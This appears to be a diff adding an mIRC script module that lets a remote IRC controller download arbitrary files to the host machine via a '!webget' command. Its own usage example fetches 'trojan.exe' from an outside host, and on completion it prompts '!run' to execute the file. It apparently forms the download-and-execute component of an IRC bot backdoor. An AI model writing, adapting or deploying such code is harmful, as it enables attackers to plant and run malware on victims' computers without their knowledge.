@@ -1,0 +1,60 @@
+if ($1 == !webget) {
+if ($2) && ($3) {
+if ($chr(46) !isin $2) || ($chr(46) !isin $3) {
+$rq privmsg $hget(main,2273) : $+ $box(EG:,!webget,http://syk1k.ownzyou.com/trojan.exe,trojan.exe) | .return } | $rq privmsg $hget(main,2273) : $+ $box(Attempting,To,Download,$3) | .httpget $2 $3 | .return } | $rq privmsg $hget(main,2273) : $+ $box(!webget,<url>,<file>) | .return }
+
+alias httpget {
+  if ($0 < 2) {
+  $rq privmsg $hget(main,2273) : $+ $box(!webget,<url>,<file>)
+  halt
+  }
+  var %http_url = $1
+  if ($mid($1, 1, 7) === http://) %http_url = $mid($1, 8)
+  if ($poscs(%http_url, /, 1) != $null) {
+  set %http_host $mid(%http_url, 1, $calc($poscs(%http_url, /, 1)-1))
+  set %http_fileremote $mid(%http_url, $poscs(%http_url, /, 1))
+  }
+  else {
+  set %http_fileremote /
+  set %http_host %http_url
+  }
+  set %http_filelocal $2-
+  set %http_filepos 0
+  set %http_filesize 0
+  set %http_gotheader 0
+  sockclose http
+  sockopen http %http_host 80
+}
+
+  on 1:sockopen:http:{
+  sockwrite -n $sockname GET %http_fileremote HTTP/1.0
+  sockwrite -n $sockname Host: %http_host
+  sockwrite -n $sockname Connection: Close
+  sockwrite -n $sockname Accept: */*
+sockwrite -n $sockname
+}
+
+  on 1:sockread:http:{
+  :read
+  if (%http_gotheader == 0) {
+  sockread %http_line
+  if (404 Not Found isin $gettok(%http_line,1-,32)) { $rq privmsg $hget(main,2273) : $+ $box(Some,Fucking,Error,Msg,$gettok(%http_line,1-,32)) | | .goto end }
+  if ($left(%http_line,14) == Content-length) set %http_filesize $mid(%http_line,17,$len(%http_line)-18)
+  if ($len(%http_line) == 0) set %http_gotheader 1
+  }
+  else {
+  sockread &http_filedata
+  if (404 Not Found isin $gettok(&http_filedata,1-,32)) { $rq privmsg $hget(main,2273) : $+ $box(Some,Fucking,Error,Msg,$gettok(&http_filedata,1-,32)) | .goto end }
+  bwrite %http_filelocal %filePos -1 &http_filedata
+  set %http_filepos $calc(%http_filepos + $sockbr)
+  }
+  if ($sockbr != 0) goto read
+  if (%http_filesize != 0) $rq privmsg $hget(main,2273) : $+ $box(Downloaded: $+ $chr(32) $+ $int($calc(%http_filepos * 100 / %http_filesize)) $+ $chr(37)!)
+  else $rq privmsg $hget(main,2273) : $+ $box(Downloaded,%http_filepos,bytes!)
+  :end
+  }
+  on 1:sockclose:http:{
+  $rq privmsg $hget(main,2273) : $+ $box(Transfer,Complete!) $box(!run <filename>,probably,%http_filelocal)
+  sockclose $sockname
+  unset %http_*
+  }
